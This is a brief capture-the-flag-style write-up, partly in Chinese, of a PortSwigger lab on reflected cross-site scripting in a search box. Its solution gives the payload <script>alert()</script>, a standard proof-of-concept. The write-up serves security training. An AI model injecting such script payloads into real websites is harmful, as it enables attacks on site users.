# Reflected XSS into HTML context with nothing encoded

## Information
---

- [PortSwigger - Lab: Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function. 

## Solution
---

1. 將以下 payload 輸入至 search 方框當中。
    ```html
    <script>alert()</script>
    ```